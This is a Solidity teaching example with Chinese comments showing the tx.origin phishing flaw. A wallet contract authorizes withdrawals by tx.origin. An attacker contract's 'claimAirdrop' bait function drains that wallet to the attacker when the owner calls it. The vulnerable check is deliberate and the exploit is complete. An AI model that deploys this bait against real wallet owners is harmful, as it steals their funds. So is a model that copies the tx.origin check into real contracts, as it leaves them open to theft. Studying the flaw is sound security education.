// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// --- 1. 受害者钱包 (Phishable Wallet) ---
contract Phishable {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    // [漏洞]：使用 tx.origin 判断权限
    // 只要源头是 owner，就允许转账。忽略了中间人可能是黑客。
    function withdrawAll(address _recipient) public {
        require(tx.origin == owner, "Hacker detected? No, you look like owner.");
        payable(_recipient).transfer(address(this).balance);
    }
}

// --- 2. 攻击者合约 (Malicious Contract) ---
contract Attack {
    Phishable public victim;
    address payable public hacker;

    constructor(Phishable _victim) {
        victim = _victim;
        hacker = payable(msg.sender);
    }

    // 诱饵函数：伪装成“领取空投”或“看似无害的逻辑”
    function claimAirdrop() public {
        // 当 owner 调用这个函数时：
        // 1. tx.origin 是 owner
        // 2. msg.sender 是 owner
        
        // 攻击开始：攻击合约代替 owner 去调用受害者钱包
        // 在 victim.withdrawAll 内部：
        //    tx.origin 依然是 owner (检查通过！)
        //    msg.sender 是 Attack 合约 (被忽略)
        victim.withdrawAll(hacker);
    }
}